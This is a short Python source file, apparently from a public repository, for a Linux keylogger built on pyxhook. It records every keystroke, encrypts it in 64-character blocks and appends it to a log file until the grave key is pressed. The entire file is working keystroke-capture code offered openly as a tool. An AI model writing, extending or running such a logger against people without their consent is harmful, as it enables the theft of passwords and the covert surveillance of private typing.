"""
Copyright (c) 2017, Nicola Sella
Modified by Nicola Sella under MIT Licence

Original Copyright (c) 2015, Aman Deep
https://github.com/hiamandeep/py-keylogger

A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`)
or a custom key is pressed

grave key is found below Esc key

"""

import pyxhook
import getpass
import encrypt as enc

from head import *
user = getpass.getuser()
#change this to your log file's path
log_file = '/home/' + user + '/Desktop/file.log'
to_log = ''
print("log")
#print(to_log)
try:
    ascii_escape
except NameError:
    #print("ascii exception")
    ascii_escape = 96

try:
    if path != "" : log_file = path
except NameError:
    #print("path exception")
    pat = ""

#this function is called everytime a key is pressed.
def OnKeyPress(event):
    fob = open(log_file, 'a')
    #fob.write(event.Key)
    global to_log
    to_log = to_log + event.Key
    if len(to_log) >= 64 :
        to_log = enc.crypt(to_log)
        fob.write(to_log[:64])
        #fob.write('\n')
        to_log = to_log[64:]
        print( len(to_log) )

    if event.Ascii == ascii_escape: #96 is the ascii value of the grave key (`)
        if len(to_log) % 64 != 0:
            print( 64 - len(to_log) )
            print( len(to_log) )
            to_log += " " * (64 - len(to_log))
            to_log = enc.crypt(to_log)
            fob.write(to_log)
            fob.close()
            new_hook.cancel()
            #instantiate HookManager class

new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
